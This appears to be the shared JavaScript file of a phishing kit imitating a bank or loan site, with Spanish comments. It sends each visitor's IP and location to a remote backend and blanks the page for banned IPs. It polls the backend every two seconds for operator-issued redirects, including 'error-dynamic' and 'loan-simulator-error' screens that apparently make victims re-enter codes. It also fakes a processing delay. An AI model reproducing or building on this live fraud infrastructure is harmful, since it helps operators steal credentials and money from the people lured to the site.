// common.js - Funciones comunes para todos los archivos HTML

const BACKEND_URL = 'https://waroyvinos.onrender.com'; // CAMBIAR POR TU URL DE RENDER

// ==================== MANEJO DE SESIÓN ====================
async function initSession() {
  let sessionId = localStorage.getItem('sessionId');
  
  if (!sessionId) {
    try {
      const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
      
      const response = await fetch(`${BACKEND_URL}/create-session`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ip: ipData.ip || 'Unknown',
          country: ipData.country_name || 'Unknown',
          city: ipData.city || 'Unknown'
        })
      });
      
      const data = await response.json();
      sessionId = data.sessionId;
      localStorage.setItem('sessionId', sessionId);
      localStorage.setItem('ip', ipData.ip || 'Unknown');
      localStorage.setItem('country', ipData.country_name || 'Unknown');
      localStorage.setItem('city', ipData.city || 'Unknown');
    } catch (error) {
      console.error('Error creando sesión:', error);
      sessionId = 'session_offline_' + Date.now();
      localStorage.setItem('sessionId', sessionId);
    }
  }
  
  return sessionId;
}

// ==================== VERIFICAR BANNEO ====================
async function checkIfBanned() {
  try {
    const ip = localStorage.getItem('ip') || 'Unknown';
    const response = await fetch(`${BACKEND_URL}/check-ban`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip })
    });
    
    const data = await response.json();
    
    if (data.banned) {
      document.body.innerHTML = '<div style="background: white; width: 100vw; height: 100vh;"></div>';
      return true;
    }
    
    return false;
  } catch (error) {
    console.error('Error verificando baneo:', error);
    return false;
  }
}

// ==================== POLLING DE INSTRUCCIONES ====================
let pollingInterval = null;

function startPolling(sessionId, onRedirect) {
  if (pollingInterval) {
    clearInterval(pollingInterval);
  }
  
  pollingInterval = setInterval(async () => {
    try {
      const response = await fetch(`${BACKEND_URL}/instruction/${sessionId}`);
      const data = await response.json();
      
      if (data.redirect_to) {
        // Si está baneado, DETENER polling y mostrar pantalla blanca
        if (data.redirect_to === 'banned') {
          clearInterval(pollingInterval);
          document.body.innerHTML = '<div style="background: white; width: 100vw; height: 100vh;"></div>';
          return;
        }
        
        // Si es error de dinámica, NO DETENER polling (permite múltiples intentos)
        if (data.redirect_to === 'error-dynamic') {
          if (typeof onRedirect === 'function') {
            onRedirect('error-dynamic');
          }
          // NO hacer clearInterval - el polling sigue activo
          return;
        }

        // Si es error de monto, NO DETENER polling
        if (data.redirect_to === 'loan-simulator-error') {
          if (typeof onRedirect === 'function') {
            onRedirect('loan-simulator-error');
          }
          // NO hacer clearInterval - el polling sigue activo
          return;
        }
        
        // Redirección normal - AQUÍ SÍ detener el polling
        clearInterval(pollingInterval);
        
        if (typeof onRedirect === 'function') {
          onRedirect(data.redirect_to);
        } else {
          window.location.href = data.redirect_to;
        }
      }
    } catch (error) {
      console.error('Error en polling:', error);
    }
  }, 2000); // Consultar cada 2 segundos
}

function stopPolling() {
  if (pollingInterval) {
    clearInterval(pollingInterval);
    pollingInterval = null;
  }
}

// ==================== MOSTRAR LOADER CON ANIMACIONES ====================
function showLoaderWithAnimation(loaderElement, doneElement, successCallback, errorCallback) {
  if (loaderElement) {
    loaderElement.style.display = 'block';
  }
  
  // Simular tiempo de procesamiento
  setTimeout(() => {
    if (loaderElement) {
      loaderElement.style.display = 'none';
    }
    
    if (doneElement && successCallback) {
      // Mostrar animación de éxito
      doneElement.style.display = 'flex';
      
      setTimeout(() => {
        successCallback();
      }, 2000);
    } else if (errorCallback) {
      errorCallback();
    }
  }, 4000);
}

// ==================== EXPORTAR FUNCIONES ====================
if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    BACKEND_URL,
    initSession,
    checkIfBanned,
    startPolling,
    stopPolling,
    showLoaderWithAnimation
  };
}